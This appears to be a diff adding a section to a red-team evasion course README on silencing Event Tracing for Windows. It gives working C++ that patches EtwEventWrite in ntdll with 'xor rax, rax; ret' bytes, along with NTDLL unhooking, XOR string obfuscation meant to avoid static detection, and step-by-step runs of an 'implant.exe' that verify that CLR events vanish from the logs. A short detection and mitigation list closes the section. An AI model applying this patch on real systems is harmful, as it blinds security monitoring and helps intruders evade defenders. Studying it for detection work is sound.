@@ -1984,3 +1984,421 @@ Perun's Fart provides an elegant solution to the NTDLL unhooking problem by leve
 This technique demonstrates sophisticated understanding of Windows internals and process timing, offering a reliable method for security researchers to operate in hooked environments without triggering disk-based detection mechanisms.
 
 </details>
+
+
+<details>
+<summary>07 - Silencing Process Event Tracing</summary>
+
+## Overview
+
+Event Tracing for Windows (ETW) is a powerful kernel-level tracing facility that provides detailed monitoring of application and operating system events. This repository demonstrates techniques for bypassing ETW monitoring by patching critical functions in memory, specifically targeting the `EtwEventWrite` function in ntdll.dll.
+
+<img width="919" height="888" alt="image" src="https://github.com/user-attachments/assets/c09919b9-fdf0-44ec-b875-901686ff8498" />
+
+## ETW Architecture Overview
+
+[02.Non-admin/02.SilenceETW](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/02.SilenceETW)
+
+ETW consists of three main components:
+
+- **Event Providers**: Components that generate events (applications, drivers, system components)
+- **Event Controllers**: Manage tracing sessions and configure providers  
+- **Event Consumers**: Applications that read and process event data
+
+ETW operates as a "best-effort" framework that can capture detailed system information including:
+- Process creation and command-line arguments
+- Network activity and DNS queries
+- WMI execution details
+- .NET runtime events
+- Parent process ID information
+
+## Step-by-Step Demonstration
+
+### Step 1: Compile the Demonstration Code
+
+Open **x64 Native Tools Command Prompt for VS** and execute:
+
+```batch
+cd 02.SilenceETW
+compile.bat
+```
+
+The demonstration code performs the following:
+1. Unhooks NTDLL using fresh copy from disk
+2. Loads CLR (Common Language Runtime) into the process
+3. Initializes .NET runtime using COM interfaces
+4. Generates extensive ETW events during CLR initialization
+
+### Step 2: Understanding ETW Capabilities
+
+ETW provides comprehensive monitoring capabilities that make it the "monitoring bloodstream of Windows." It captures more thorough, detailed, and timely data than other Windows logging facilities.
+
+**Key ETW Functions:**
+- `EventRegister` - Register an event provider
+- `EventWrite` - Write events to a trace session
+- `EventUnregister` - Unregister an event provider
+- `EtwEventWrite` - Core function for writing ETW events (primary target for patching)
+
+### Step 3: Capturing ETW Events Without Patching
+
+#### Start ETW Logging Session
+
+Open an elevated command prompt and execute the commands from `logman.cmds.txt`:
+
+ <img width="958" height="273" alt="image" src="https://github.com/user-attachments/assets/2161f51d-d7aa-4c1c-8cba-b0d7e62956c9" />
+ 
+```batch
+# Start ETW session for CLR Runtime events
+logman start clrevents -p Microsoft-Windows-DotNETRuntime 0x1CCBD 0x5 -ets -ct perf
+```
+
+<img width="194" height="414" alt="image" src="https://github.com/user-attachments/assets/9713195b-a8fc-4fef-b32d-85da02748691" />
+
+
+**Command Explanation:**
+- `logman start clrevents` - Start a session named "clrevents"
+- `-p Microsoft-Windows-DotNETRuntime` - Monitor .NET Runtime provider
+- `0x1CCBD 0x5` - Keywords and level for event filtering
+- `-ets` - Execute command immediately
+- `-ct perf` - Use performance counter for timing
+
+**Note:** Administrative privileges are required for logman operations.
+
+#### Run the Unpatched Application
+
+Execute the compiled CLR loader without ETW patching:
+
+```batch
+implant.exe
+```
+
+<img width="1609" height="803" alt="image" src="https://github.com/user-attachments/assets/c6286ca0-62ce-44a8-9722-85e0e5f1fa52" />
+
+<img width="1609" height="802" alt="image" src="https://github.com/user-attachments/assets/5618bade-a682-4b34-9ff1-fee1777565aa" />
+
+The application will:
+- Display its Process ID
+- Load clr.dll into the process
+- Initialize the .NET runtime
+- Generate extensive ETW events
+- Pause for user input between stages
+
+#### Stop ETW Logging and Generate Report
+
+```batch
+# Stop the ETW session
+logman stop clrevents -ets
+
+# copy and rename it as clrevents1.et1
+move clrevents.et1 clrevents1.et1
+
+# Convert binary ETL file to readable format
+tracerpt clrevents1.etl
+``` 
+
+<img width="1609" height="800" alt="image" src="https://github.com/user-attachments/assets/0e4b305f-388e-4c6b-aaf3-367f2be69149" />
+<img width="1611" height="799" alt="image" src="https://github.com/user-attachments/assets/11633930-2a0b-420e-99f8-6da35c674d24" />
+
+
+<img width="367" height="269" alt="image" src="https://github.com/user-attachments/assets/59b29d2e-32ae-43d6-99ee-cae34b1acd75" />
+
+#### Analyze Captured Events
+
+Examine the generated XML file to observe the extensive ETW data. You should see numerous CLR-related events including:
+
+- Runtime startup events
+- AppDomain creation events  
+- Thread creation events
+- Assembly loading events
+- JIT compilation events
+- Garbage collection events
+
+`dumpfile.xml`:
+
+Let's take the process ID of our implant when it was running: 
+<img width="690" height="426" alt="image" src="https://github.com/user-attachments/assets/8fba229c-d310-4e92-bb4f-e56237014b25" />
+
+So let's search any events which are related to our process.
+
+Search for 3824:
+<img width="1608" height="803" alt="image" src="https://github.com/user-attachments/assets/90d41ba2-4f16-4157-848e-437122b82ae9" />
+
+First event we have the start of the runtime, so CLR DLL was loaded. 
+
+<img width="1604" height="796" alt="image" src="https://github.com/user-attachments/assets/3cebeb61-6ef0-40d2-9305-bbfe6cfe3c56" />
+
+Then new app domain was loaded:
+
+<img width="1612" height="795" alt="image" src="https://github.com/user-attachments/assets/fefadedf-2e22-4978-9a27-4929baf94112" />
+
+Then new thread was created:
+
+<img width="1608" height="801" alt="image" src="https://github.com/user-attachments/assets/dda1e299-18a9-4aa7-bf28-aee18b3b765c" />
+
+Some segment:
+
+<img width="1609" height="797" alt="image" src="https://github.com/user-attachments/assets/ca57f6c8-0dc8-44eb-ad53-bfbc1e8815ab" />
+
+As you can see a lot of logs related to our process has been captured. This is a clear example of how ETW is powerful.
+
+
+All right, so what we can do about it is first of all the process which wants to log its activity using ETW, it will utilize several API functions from `ntdll`, these are ETW related and what we can do from our perspective is we can patch them, because it's utilizing `NTDLL` from the process memory of our process, which we control completely. So what we can do, we can patch those functions specifically as an example, we can patch ETW event write function from `ntdll`. 
+
+### Step 4: Implementing ETW Patching
+
+#### The ETW Patching Function
+
+The core patching mechanism is implemented in the `DisableETW()` function:
+
+```cpp
+int DisableETW(void) {
+    DWORD oldprotect = 0;
+    
+    // Locate EtwEventWrite function in ntdll
+    unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
+    void * pEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR) sEtwEventWrite);
+    
+    // Change memory protection to allow writing
+    VirtualProtect(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
+
+    // Apply architecture-specific patch
+#ifdef _WIN64
+    // x64 patch: xor rax, rax; ret
+    memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4);
+#else
+    // x86 patch: xor eax, eax; ret 14
+    memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);
+#endif
+
+    // Restore original memory protection
+    VirtualProtect(pEventWrite, 4096, oldprotect, &oldprotect);
+    FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096);
+    
+    return 0;
+}
+```
+
+#### Patch Mechanism Explained
+
+**Before Patching:**
+```asm
+EtwEventWrite:
+; Complex event writing logic
+mov     rcx, [rsp+8]
+mov     rax, rcx
+; ... extensive event processing ...
+ret
+```
+
+**After Patching (x64):**
+```asm
+EtwEventWrite:
+xor rax, rax  ; Immediately return success (0)
+ret           ; Skip all event writing logic
+```
+
+**After Patching (x86):**
+```asm
+EtwEventWrite:
+xor eax, eax  ; Zero out eax (return value)
+ret 14        ; Return and clean stack
+```
+
+### Step 5: Testing with ETW Patching Enabled
+
+#### Modify the Code
+
+Uncomment the `DisableETW()` function call in the main function:
+
+```cpp
+int main(void) {
+    // ... existing code ...
+    
+    printf("PID: %d\n", GetCurrentProcessId());
+    printf("Before disabling ETW\n"); 
+    getchar();
+
+    // Enable ETW patching
+    DisableETW();
+    
+    LoadLibrary("clr.dll");
+    SummonCLR();
+    
+    printf("After disabling ETW\n"); 
+    getchar();	
+
+    return 0;
+}
+```
+
+#### Recompile and Test
+
+1. **Recompile the application** with ETW patching enabled:
+   ```batch
+   compile.bat
+   ```
+
+Before we turn on the logging again, let's rename `dumpfile.xml` to `dumpfile1.xml`, `summary.txt` to `summary1.txt`.
+
+
+2. **Start ETW logging session on the second cmd**:
+   ```batch
+   logman start clrevents -p Microsoft-Windows-DotNETRuntime 0x1CCBD 0x5 -ets -ct perf
+   ```
+
+3. **Run the patched application**:
+   ```batch
+   implant.exe
+   ```
+
+   <img width="1610" height="798" alt="image" src="https://github.com/user-attachments/assets/2e1d6197-a16d-4173-bf55-0e56018169b3" />
+
+
+4. **Stop ETW logging** and generate report:
+   ```batch
+   logman stop clrevents -ets
+
+   # change name
+   move clrevents.etl clrevents2.etl
+   
+   tracerpt clrevents2.etl
+   ```
+
+   On File Explorer rename the `dumpfile.xml` to `dumpfile2.xml`:
+
+   <img width="347" height="377" alt="image" src="https://github.com/user-attachments/assets/256c9ae3-3422-4a47-86ec-9a345c50b4e5" />
+
+
+#### Expected Results
+
+- PID: 6052
+  <img width="815" height="400" alt="image" src="https://github.com/user-attachments/assets/897adfeb-4496-4d48-a9fe-0e6888424596" />
+  
+After applying the ETW patch:
+- The application should run normally
+- CLR should load and initialize successfully
+- **No CLR-related ETW events** should appear in the logs
+  <img width="1692" height="829" alt="image" src="https://github.com/user-attachments/assets/3caf53c9-fb6e-4e4b-95ab-ab105397db7f" />
+  
+- Only system-level events from other processes may be captured
+- Compare `clr_events.xml` (without patch) vs `clr_events_patched.xml` (with patch)
+
+
+
+### Step 6: Debugger Analysis
+
+#### Attach Debugger for Verification
+
+1. **Run the patched application again on cmd `implant.exe`**
+2. **Attach debugger** x64dbg to the process
+   <img width="1093" height="601" alt="image" src="https://github.com/user-attachments/assets/f1fa1587-c4b6-455e-9c1b-241f903da62d" />
+
+4. **Examine the EtwEventWrite function** in ntdll.dll
+   <img width="1677" height="809" alt="image" src="https://github.com/user-attachments/assets/35a86de6-b665-4ae5-99c8-71f3bfe91030" />
+
+#### Expected Debugger Output
+
+This is the beginning of the function:
+<img width="1687" height="816" alt="image" src="https://github.com/user-attachments/assets/7e29ad5f-4c15-454b-9bc5-fc4418e3dc5f" />
+
+Click on the blue arrow to continue, go back on cmd and hit `enter` and the `CLR` should be loaded:
+<img width="1681" height="832" alt="image" src="https://github.com/user-attachments/assets/b33a65f7-251d-4d54-9128-0bfe03145d75" />
+
+
+**After Patching (x64):**
+
+Now you can see the patch:
+<img width="1683" height="540" alt="image" src="https://github.com/user-attachments/assets/bb7441fc-32a1-4e55-9b08-40874dcfbd16" />
+
+
+## Technical Implementation Details
+
+### Core Components
+
+#### 1. ETW Patching (`DisableETW`)
+
+The primary function that patches `EtwEventWrite` to prevent event generation.
+
+#### 2. NTDLL Unhooking (`UnhookNtdll`)
+
+Ensures clean NTDLL copy is used before applying ETW patches:
+
+```cpp
+static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
+    // Parse PE headers and copy clean .text section
+    // Overwrites any existing hooks in the current process
+}
+```
+
+#### 3. CLR Loading (`SummonCLR`)
+
+Demonstrates ETW event generation by loading .NET runtime:
+
+```cpp
+int SummonCLR(void) {
+    // Uses COM interfaces to initialize CLR
+    // Generates extensive ETW events during initialization
+}
+```
+
+### XOR Encryption Utility
+
+```cpp
+void XORcrypt(char str2xor[], size_t len, char key) {
+    for (int i = 0; i < len; i++) {
+        str2xor[i] = (BYTE)str2xor[i] ^ key;
+    }
+}
+```
+
+Used for string obfuscation to avoid static detection.
+
+## Building the Project
+
+### Prerequisites
+
+- Visual Studio 2019 or later with C++ tools
+- Windows SDK
+- x64 Native Tools Command Prompt
+
+### Compilation
+
+Use the provided `compile.bat` script:
+
+```batch
+compile.bat
+```
+
+This batch file handles the compilation process for the implant.
+
+## Detection and Mitigation
+
+### Detection Opportunities
+
+- Memory protection changes on ntdll functions
+- ETW event gaps or abnormal silence
+- Function hooking detection in security products
+- Behavioral analysis of patching patterns
+
+### Defensive Considerations
+
+- Monitor `VirtualProtect` calls targeting system DLLs
+- Implement checksum validation for critical functions
+- Use tamper protection mechanisms
+- Deploy behavioral detection for ETW suppression
+
+## Limitations
+
+- Patch is process-specific and must be applied per-process
+- May be detected by advanced EDR solutions
+- Only affects user-mode ETW providers
+- Requires code execution in target process
+
+## References
+
+- [Microsoft ETW Documentation](https://docs.microsoft.com/en-us/windows/win32/etw/event-tracing-portal)
+- [Controlling .NET Framework Logging](https://docs.microsoft.com/en-us/dotnet/framework/performance/controlling-logging)
+- [Windows Internals, 7th Edition](https://www.microsoftpressstore.com/store/windows-internals-part-1-system-architecture-processes-9780735684188)
+
+
+</details>
